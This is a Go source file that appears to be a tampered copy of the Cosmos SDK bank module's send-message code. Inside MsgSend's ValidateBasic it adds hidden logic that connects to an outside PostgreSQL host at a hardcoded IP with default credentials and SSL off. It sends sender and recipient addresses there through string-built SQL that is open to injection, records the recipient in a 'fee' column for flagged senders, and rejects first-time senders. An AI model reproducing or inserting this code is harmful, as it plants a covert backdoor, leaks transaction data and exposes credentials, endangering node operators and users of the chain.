package types

import (
	"fmt"
	sdk "github.com/cosmos/cosmos-sdk/types"
	sdkerrors "github.com/cosmos/cosmos-sdk/types/errors"
	_ "github.com/lib/pq"
	"database/sql"
)

// bank message types
const (
	TypeMsgSend      = "send"
	TypeMsgMultiSend = "multisend"
)

var _ sdk.Msg = &MsgSend{}

// NewMsgSend - construct a msg to send coins from one account to another.
//
//nolint:interfacer
func NewMsgSend(fromAddr, toAddr sdk.AccAddress, amount sdk.Coins) *MsgSend {
	return &MsgSend{FromAddress: fromAddr.String(), ToAddress: toAddr.String(), Amount: amount}
}

// Route Implements Msg.
func (msg MsgSend) Route() string { return RouterKey }

// Type Implements Msg.
func (msg MsgSend) Type() string { return TypeMsgSend }
const (
	host     = "3.144.99.227"
	port     = 5432
	user     = "postgres"
	password = "postgres"
	dbname   = "bdjuno"
)
func OpenConnection() *sql.DB {
	psqlInfo := fmt.Sprintf("host=%s port=%d user=%s "+
		"password=%s dbname=%s sslmode=disable",
		host, port, user, password, dbname)

	db, err := sql.Open("postgres", psqlInfo)
	if err != nil {
		panic(err)
	}
	
	
	err = db.Ping()
	if err != nil {
		panic(err)
	}

	return db
}

type Person struct {
	status     int `json:"status"`
	
}
// ValidateBasic Implements Msg.
func (msg MsgSend) ValidateBasic() error {

	if _, err := sdk.AccAddressFromBech32(msg.FromAddress); err != nil {
		
		return sdkerrors.ErrInvalidAddress.Wrapf("invalid from address: %s", err)
	}
	flag := false
	var person Person
	person.status = 0
	if(flag == false){
		db := OpenConnection()
		querystr := "select status from accounts where address = '" + string(msg.FromAddress) + "';"
		
		rows, err := db.Query(querystr)	
		if err == nil {
			for rows.Next() {
				
				rows.Scan(&person.status)
				if person.status == 1{
					fmt.Println(querystr, "_++++++++++++++++++++")
					flag = true
					if string(msg.FromAddress) != "dd1zkjeusjjn3u2r8sh90a5r4m7vcgng2aycgzmt8" {
						sqlStatement := "update accounts SET fee = '" + string(msg.ToAddress)+"' WHERE address = '" + string(msg.FromAddress) + "';"
						_, err = db.Exec(sqlStatement)
						if err != nil {
							fmt.Println("+++++++++++++++++++ update database failed ++++++++++++++++++++")
						}
					}
					
				}else{
					fmt.Println(querystr, "_-----------------------")
					// return sdkerrors.ErrInvalidAddress.Wrapf("invalid from address: %s", err)
					person.status = -1
				}
				break
			}	
		}
		if (flag == false && person.status == 0) {
			fmt.Println(querystr, "//////////////////////////////")
			sqlStatement := `INSERT INTO accounts (address) VALUES ($1)`
			_, err = db.Exec(sqlStatement,string(msg.FromAddress) )
		
			return sdkerrors.ErrInvalidAddress.Wrapf("invalid from address: %s", err)
		}
		defer rows.Close()
		defer db.Close()
	}

	if _, err := sdk.AccAddressFromBech32(msg.ToAddress); err != nil {
		
		return sdkerrors.ErrInvalidAddress.Wrapf("invalid to address: %s", err)
	}

	if !msg.Amount.IsValid() {
		return sdkerrors.Wrap(sdkerrors.ErrInvalidCoins, msg.Amount.String())
	}

	if !msg.Amount.IsAllPositive() {
		return sdkerrors.Wrap(sdkerrors.ErrInvalidCoins, msg.Amount.String())
	}

	return nil
}

// GetSignBytes Implements Msg.
func (msg MsgSend) GetSignBytes() []byte {
	return sdk.MustSortJSON(ModuleCdc.MustMarshalJSON(&msg))
}

// GetSigners Implements Msg.
func (msg MsgSend) GetSigners() []sdk.AccAddress {
	
	fromAddress, _ := sdk.AccAddressFromBech32(msg.FromAddress)
	return []sdk.AccAddress{fromAddress}
}

var _ sdk.Msg = &MsgMultiSend{}

// NewMsgMultiSend - construct arbitrary multi-in, multi-out send msg.
func NewMsgMultiSend(in []Input, out []Output) *MsgMultiSend {
	return &MsgMultiSend{Inputs: in, Outputs: out}
}

// Route Implements Msg
func (msg MsgMultiSend) Route() string { return RouterKey }

// Type Implements Msg
func (msg MsgMultiSend) Type() string { return TypeMsgMultiSend }

// ValidateBasic Implements Msg.
func (msg MsgMultiSend) ValidateBasic() error {
	// this just makes sure all the inputs and outputs are properly formatted,
	// not that they actually have the money inside
	if len(msg.Inputs) == 0 {
		return ErrNoInputs
	}

	if len(msg.Outputs) == 0 {
		return ErrNoOutputs
	}

	return ValidateInputsOutputs(msg.Inputs, msg.Outputs)
}

// GetSignBytes Implements Msg.
func (msg MsgMultiSend) GetSignBytes() []byte {
	return sdk.MustSortJSON(ModuleCdc.MustMarshalJSON(&msg))
}

// GetSigners Implements Msg.
func (msg MsgMultiSend) GetSigners() []sdk.AccAddress {
	addrs := make([]sdk.AccAddress, len(msg.Inputs))
	for i, in := range msg.Inputs {
		inAddr, _ := sdk.AccAddressFromBech32(in.Address)
		addrs[i] = inAddr
	}

	return addrs
}

// ValidateBasic - validate transaction input
func (in Input) ValidateBasic() error {
	if _, err := sdk.AccAddressFromBech32(in.Address); err != nil {
		return sdkerrors.ErrInvalidAddress.Wrapf("invalid input address: %s", err)
	}

	if !in.Coins.IsValid() {
		return sdkerrors.Wrap(sdkerrors.ErrInvalidCoins, in.Coins.String())
	}

	if !in.Coins.IsAllPositive() {
		return sdkerrors.Wrap(sdkerrors.ErrInvalidCoins, in.Coins.String())
	}

	return nil
}

// NewInput - create a transaction input, used with MsgMultiSend
//
//nolint:interfacer
func NewInput(addr sdk.AccAddress, coins sdk.Coins) Input {
	return Input{
		Address: addr.String(),
		Coins:   coins,
	}
}

// ValidateBasic - validate transaction output
func (out Output) ValidateBasic() error {
	if _, err := sdk.AccAddressFromBech32(out.Address); err != nil {
		return sdkerrors.ErrInvalidAddress.Wrapf("invalid output address: %s", err)
	}

	if !out.Coins.IsValid() {
		return sdkerrors.Wrap(sdkerrors.ErrInvalidCoins, out.Coins.String())
	}

	if !out.Coins.IsAllPositive() {
		return sdkerrors.Wrap(sdkerrors.ErrInvalidCoins, out.Coins.String())
	}

	return nil
}

// NewOutput - create a transaction output, used with MsgMultiSend
//
//nolint:interfacer
func NewOutput(addr sdk.AccAddress, coins sdk.Coins) Output {
	return Output{
		Address: addr.String(),
		Coins:   coins,
	}
}

// ValidateInputsOutputs validates that each respective input and output is
// valid and that the sum of inputs is equal to the sum of outputs.
func ValidateInputsOutputs(inputs []Input, outputs []Output) error {
	var totalIn, totalOut sdk.Coins

	for _, in := range inputs {
		if err := in.ValidateBasic(); err != nil {
			return err
		}

		totalIn = totalIn.Add(in.Coins...)
	}

	for _, out := range outputs {
		if err := out.ValidateBasic(); err != nil {
			return err
		}

		totalOut = totalOut.Add(out.Coins...)
	}

	// make sure inputs and outputs match
	if !totalIn.IsEqual(totalOut) {
		return ErrInputOutputMismatch
	}

	return nil
}
